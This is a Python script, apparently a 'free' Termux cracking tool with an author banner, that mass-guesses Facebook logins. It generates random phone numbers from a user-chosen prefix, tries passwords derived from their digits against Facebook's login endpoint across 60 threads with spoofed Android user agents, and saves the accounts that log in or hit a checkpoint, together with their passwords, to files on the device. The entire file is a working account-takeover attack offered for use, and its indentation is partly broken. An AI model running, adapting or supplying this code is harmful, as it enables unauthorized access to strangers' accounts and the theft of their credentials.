import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
logo = ('''
──╔╦╗─╔╦══╗╔═══╦══╦═══╗
──║║║─║║╔╗║║╔═╗╠╣╠╣╔═╗║
──║║║─║║╚╝╚╣║─║║║║║╚═╝║
╔╗║║║─║║╔═╗║╚═╝║║║║╔╗╔╝
║╚╝║╚═╝║╚═╝║╔═╗╠╣╠╣║║╚╗
╚══╩═══╩═══╩╝─╚╩══╩╝╚═╝
{warna}═════════════════════════════════════════════
 Owner    : Jubair Ahmad
 Guthub   : Jubairbro
 Facebook : Jubair bro
 Taligram : https://t.me/jubairff
 Tools   : FREE •[version 0.4]
═════════════════════════════════════════════''')
ok = []
cp = []
id = []
session = requests.Session()
user = []
loop = 0
oks = []
cps = []
loop = 0
ugen=[]
ugen2=[]

ugen2 = ('Dalvik/2.1.0 (Linux; U; Android 9; Haier 4K Android TV Build/PTO3.220801.001',
'Dalvik/2.1.0 (Linux; U; Android 11; Cable Color Build/RQ2A.210505.003',
'Dalvik/2.1.0 (Linux; U; Android 11.1; AB-35 Build/PPR1.180610.011',
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Aquaris U Plus Build/MMB29M',
'Dalvik/2.1.0 (Linux; U; Android 13; 8K3528-T Build/TQ2A.230305.008.F1',
'Dalvik/2.1.0 (Linux; U; Android 13; Lenovo YT-K606F Build/TKQ1.221013.002',
'Dalvik/2.1.0 (Linux; U; Android 13; moto g 5G - 2023 Build/T1TPNS33.58-68-2',
'Dalvik/2.1.0 (Linux; U; Android 9; HYUNDAI 2K Android TV Build/PTO2.210830.001',
'Dalvik/2.1.0 (Linux; U; Android 11; X96_X4_Pro1 Build/RD2A.211001.002',
'Dalvik/2.1.0 (Linux; U; Android 10; Nokia 3.1 Plus Build/QP1A.190711.020) VD/238',
'Dalvik/2.1.0 (Linux; U; Android 9; BboxTV Build/PTT1.201118.001)',
'Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-C7100 Build/M1AJQ) AppleWebKit [PB/107]',
'Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVX22A Build/RTM6.230109.052',
'Dalvik/2.1.0 (Linux; U; Android 11; POLYTRON2K Build/RTM3.211215.220',
'Dalvik/2.1.0 (Linux; U; Android 9; X1-Prime-c Build/PTT1.190604.001',
'Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R115-15474.70.0',
'Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-7-15',
'Dalvik/2.1.0 (Linux; U; Android 9; AFTR Build/PS7652.3556N',
'Dalvik/2.1.0 (Linux; U; Android 10; DAZN Build/QTG1.210627.001',
'Dalvik/2.1.0 (Linux; U; Android 11; T768S Build/RKQ1.210614.002',
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',)  

for ua in range(1000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['12' , '13' , '14' , '15'])
      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,100)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
def Main():
	os.system('clear')
	print(logo)
	print("[🌺] EXAMPLE : [017 018 019 013 015 016] ")
	love = input('[🍁] SELECT : ')
	print('[🌺] EXAMPLE : [1000,5000,10000,15000,20000] ')
	limit = int(input('[🍁] LIMIT : '))
	for nmbr in range(limit):
		lova = ''.join(random.choice(string.digits) for _ in range(2))
		lovb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=60) as turag:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
		print('     [🌺] CHOICE CODE : '+love)
		print('     [🌺] TOTAL ID   :  '+tl)
		print('     [🌺] CRACK STARTED....... ')
		print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
		for guru in user:
			uid = love+lova+lovb+guru
			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
			turag.submit(test,uid,pwx,tl)
	print(50*'━')
	print(' [🍁] Crack has been completed')
	print(50*'━')
	exit()
def test(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mJUBAIR\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen2)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
        header_freefb = {'authority': 'p.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                
                print(f"\033[38;5;46m ┏━[BRO OK 🤍] ")
                print(f"\033[38;5;46m ┣━[Number] : {cid} ")
                print(f"\033[38;5;46m ┗━[Password] : {ps} ")
                oks.append(cid)
                open('/sdcard/JUBAIR-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                
                print(f"\033[38;5;46m ┏━[BRO CP💔] ")
                print(f"\033[38;5;46m ┣━[Number] : {uid} ")
                print(f"\033[38;5;46m ┗━[Password] : {ps} ")
                open('/sdcard/JUBAIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1        
    except:
        pass
Main()